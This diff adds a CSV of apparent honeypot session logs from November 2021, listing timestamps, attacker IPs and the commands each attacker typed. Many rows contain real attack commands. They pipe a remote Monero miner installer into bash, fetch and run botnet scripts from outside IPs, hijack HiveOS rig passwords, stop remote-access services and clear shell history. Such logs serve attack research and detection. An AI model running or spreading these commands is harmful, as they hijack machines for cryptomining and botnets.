@@ -1,0 +1,122 @@
+attackdate,attackerip,entrancetime,exittime,commands
+2021-11-15,10.0.3.97,23:52:48.295,23:52:50.150,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-25,10.0.3.254,23:55:45.756,00:00:01.130,['scp -t /tmp/vAqPX8ga']
+2021-11-16,10.0.3.68,00:50:02.515,01:00:01.243,['scp -t /tmp/cNNUcQGX']
+2021-11-24,10.0.3.235,00:51:06.024,01:00:00.167,"['echo `hostname`;echo -e `hostname`n`hostname` | passwd', 'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA']"
+2021-11-26,10.0.3.241,01:07:03.297,01:07:24.310,[]
+2021-11-18,10.0.3.188,01:50:15.726,02:00:01.329,[]
+2021-11-19,10.0.3.167,01:46:45.570,01:48:28.408,[]
+2021-11-21,10.0.3.247,01:53:26.258,02:00:01.611,['/ip cloud print']
+2021-11-16,10.0.3.131,02:07:01.324,02:27:42.461,[]
+2021-11-17,10.0.3.121,02:11:50.537,02:29:35.417,[]
+2021-11-20,10.0.3.58,02:25:08.341,02:25:28.506,['scp -t /tmp/ft19ljqs']
+2021-11-17,10.0.3.114,02:39:16.083,02:53:03.497,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-18,10.0.3.2,02:56:00.383,03:00:01.234,[]
+2021-11-26,10.0.3.217,02:54:03.192,02:54:05.110,"['sudo hive-passwd dg801b23dg12dwqsdghaiodg120dgasodg1wo08_123Z', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-16,10.0.3.78,03:10:25.942,03:19:47.108,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.10,03:15:45.208,03:27:38.609,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-17,10.0.3.14,03:38:07.012,04:00:01.897,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-17,10.0.3.156,04:04:06.971,04:29:08.619,['scp -t /tmp/CCyWkiWA']
+2021-11-18,10.0.3.34,04:09:17.732,04:09:18.518,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.144,04:41:12.142,05:00:01.897,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.88,04:47:08.314,05:00:01.934,[]
+2021-11-18,10.0.3.137,04:49:40.457,04:58:57.335,[]
+2021-11-22,10.0.3.139,04:59:40.874,04:59:41.554,['scp -t /tmp/Bu5Hk54j']
+2021-11-16,10.0.3.87,05:29:56.289,05:29:58.227,[]
+2021-11-17,10.0.3.85,05:28:45.372,05:30:01.085,"['ls', 'nmpproc', 'ls', 'curl', 'sudo su', 'vhserver', '[ETX][ETX][ETX]curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr[CR]', '']"
+2021-11-16,10.0.3.8,05:44:07.378,06:00:01.271,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.16,05:43:33.011,06:00:01.140,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.215,05:41:31.599,06:00:01.816,['scp -t /tmp/C9xanYtV']
+2021-11-16,10.0.3.189,06:09:36.731,06:09:45.174,['/ip cloud print']
+2021-11-17,10.0.3.126,06:21:38.979,06:29:16.554,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.107,06:53:43.369,06:53:43.955,"['sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.170,06:45:42.563,07:00:02.031,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.197,07:16:24.968,07:20:25.637,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.79,07:15:15.254,07:29:50.652,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.73,07:15:44.077,07:29:15.785,"['sudo hive-passwd localhost', 'echo localhost', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-26,10.0.3.25,07:13:52.155,07:24:53.802,"['sudo hive-passwd dg801b23dg12dwqsdghaiodg120dgasodg1wo08_123Z', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-16,10.0.3.30,07:39:31.241,08:00:01.792,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.139,07:58:18.297,07:58:20.158,"['sudo hive-passwd localhost', 'echo localhost', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.207,08:18:56.520,08:18:58.458,[]
+2021-11-24,10.0.3.69,08:24:09.973,08:24:29.324,['scp -t /tmp/WweqbLbZ']
+2021-11-16,10.0.3.116,08:42:31.808,08:56:19.627,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.198,08:55:23.200,08:55:56.376,['scp -t /tmp/b1Qxzduv']
+2021-11-17,10.0.3.104,09:09:58.185,09:29:36.387,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.204,09:05:37.791,09:29:34.862,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-24,10.0.3.86,09:17:30.051,09:17:36.974,['/ip cloud print']
+2021-11-27,10.0.3.234,09:15:12.284,09:19:47.618,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://149.56.35.183/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 149.56.35.183 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-11-17,10.0.3.35,09:50:42.535,09:51:43.608,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-16,10.0.3.246,10:24:44.200,10:24:50.484,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.227,10:03:17.412,10:27:39.943,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.152,10:26:37.333,10:26:39.782,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-22,10.0.3.109,10:25:32.152,10:30:01.318,['scp -t /tmp/jjLDKEpf']
+2021-11-16,10.0.3.38,10:46:36.298,11:00:01.501,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-17,10.0.3.158,10:40:02.280,10:48:48.834,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.116,10:39:18.829,11:00:01.515,['scp -t /tmp/SMlyZvTU']
+2021-11-16,10.0.3.251,11:12:55.349,11:30:01.411,['scp -t /tmp/bUzBFwIw']
+2021-11-17,10.0.3.101,11:05:59.602,11:30:01.029,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-26,10.0.3.125,11:24:43.267,11:25:10.262,[]
+2021-11-17,10.0.3.48,11:43:54.657,11:58:08.718,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.117,11:45:03.305,11:45:04.109,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.185,12:07:39.873,12:21:40.910,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.191,12:10:02.840,12:27:33.212,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.73,12:41:08.892,12:54:34.539,[]
+2021-11-17,10.0.3.249,12:49:45.367,13:00:01.765,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.248,12:52:00.706,13:00:01.535,[]
+2021-11-16,10.0.3.123,13:22:24.214,13:22:26.129,[]
+2021-11-17,10.0.3.50,13:13:26.908,13:27:24.721,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.159,13:03:01.518,13:28:13.483,[]
+2021-11-16,10.0.3.195,13:51:46.742,14:00:01.415,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.166,13:41:07.778,13:59:11.960,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-18,10.0.3.236,13:44:47.614,13:44:48.775,[]
+2021-11-19,10.0.3.254,13:44:27.243,13:45:30.093,['uname -s -v -n -r -m']
+2021-11-17,10.0.3.161,14:18:03.186,14:30:01.530,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.123,14:44:54.359,14:51:26.802,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://172.105.119.145/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 172.105.119.145 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-11-17,10.0.3.6,14:47:31.859,15:00:01.059,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-27,10.0.3.40,14:59:59.273,14:59:59.736,['scp -t /tmp/uSKVBvBa']
+2021-11-16,10.0.3.100,15:18:31.771,15:18:32.553,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.98,15:10:51.587,15:10:53.775,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.53,15:18:47.614,15:29:47.466,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-19,10.0.3.241,15:28:53.055,15:29:55.129,['scp -t /tmp/HQWRz6ft']
+2021-11-16,10.0.3.215,15:42:49.718,16:00:01.693,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg']"
+2021-11-17,10.0.3.139,15:55:24.664,15:55:26.625,[]
+2021-11-27,10.0.3.200,15:54:46.216,15:58:59.506,['scp -t /tmp/wFGDQ6L6']
+2021-11-16,10.0.3.68,16:08:59.804,16:09:00.606,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.130,16:13:18.072,16:29:56.819,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-18,10.0.3.142,16:40:35.426,16:41:07.214,['scp -t -- /tmp/M4R6HQTO']
+2021-11-20,10.0.3.67,16:52:45.278,17:00:01.962,[]
+2021-11-17,10.0.3.217,17:22:43.597,17:22:46.446,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.243,17:38:23.240,17:58:16.261,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-17,10.0.3.189,17:41:13.468,17:41:16.779,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-25,10.0.3.47,17:57:11.159,17:57:44.220,[]
+2021-11-16,10.0.3.222,18:04:50.150,18:29:49.942,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-17,10.0.3.137,18:16:21.241,18:19:48.163,['uname -s -v -n -r -m']
+2021-11-15,10.0.3.142,18:50:51.308,18:58:30.154,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.207,18:41:08.335,18:55:01.558,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-17,10.0.3.135,18:57:28.542,19:00:01.217,['uname -s -v -n -r -m']
+2021-11-18,10.0.3.193,18:53:17.247,18:57:27.289,['/ip cloud print']
+2021-11-21,10.0.3.221,18:42:37.138,18:58:51.295,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://54.37.79.0/0x83911d24Fx.sh', 'curl -O http://54.37.79.0/0x83911d24Fx.sh', 'chmod 777 0x83911d24Fx.sh', 'sh 0x83911d24Fx.sh', 'tftp 54.37.79.0  -c get 0xt984767.sh', 'chmod 777 0xft6426467.sh', 'sh 0xft6426467.sh', 'tftp -r 0xtf2984767.sh -g 54.37.79.0 ', 'chmod 777 0xtf2984767.sh', 'sh 0xtf2984767.sh', 'ftpget -v -u anonymous -p anonymous -P 21 54.37.79.0  0xft6426467.sh 0xft6426467.sh', 'sh 0xft6426467.sh', 'rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh', 'rm -rf *']"
+2021-11-22,10.0.3.246,18:46:53.890,18:49:05.506,['uname -s -v -n -r -m']
+2021-11-16,10.0.3.128,19:03:52.469,19:23:22.690,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-19,10.0.3.67,19:19:45.175,19:22:39.524,['uname -s -v -n -r -m']
+2021-11-21,10.0.3.152,19:29:31.750,19:30:00.610,[]
+2021-11-21,10.0.3.49,19:46:01.008,19:46:22.753,['scp -t /tmp/KsYHoBmS']
+2021-11-15,10.0.3.204,20:28:01.890,20:28:03.026,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.226,20:10:21.600,20:21:46.892,[]
+2021-11-17,10.0.3.192,20:11:16.556,20:30:01.201,[]
+2021-11-25,10.0.3.17,20:09:37.626,20:10:05.291,"['sudo hive-passwd simp123', 'sudo pkill Xorg', 'sudo pkill x11vnc', 'uname -a']"
+2021-11-26,10.0.3.11,20:19:56.123,20:22:57.973,[]
+2021-11-16,10.0.3.217,20:42:24.245,21:00:01.340,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-17,10.0.3.108,20:44:53.153,20:44:53.837,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-26,10.0.3.239,20:47:34.165,21:00:01.647,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
+2021-11-15,10.0.3.189,21:04:42.856,21:27:10.934,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-18,10.0.3.91,21:20:18.038,21:20:19.017,['uname -s -v -n -r -m']
+2021-11-22,10.0.3.135,21:13:31.203,21:24:18.495,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45dNkjTQGgT77r9AEMyHdCGan5tpuekXaHFhFW99dQ8hUS35oZQEYXddFE52jxVdfUNrAD4ZyZ44BgHfgk5SjHdoLjGdJnQ']
+2021-11-15,10.0.3.103,21:39:46.204,21:39:47.010,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.97,21:44:58.793,22:00:02.008,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-15,10.0.3.13,22:16:58.423,22:17:00.207,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.120,22:29:19.454,22:29:22.113,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-25,10.0.3.166,22:23:43.837,22:24:04.511,['scp -t /tmp/MDnMnXLc']
+2021-11-15,10.0.3.187,22:49:45.770,22:49:47.679,[]
+2021-11-16,10.0.3.119,23:05:14.677,23:23:39.201,[]
+2021-11-17,10.0.3.88,23:03:15.451,23:06:13.241,[]
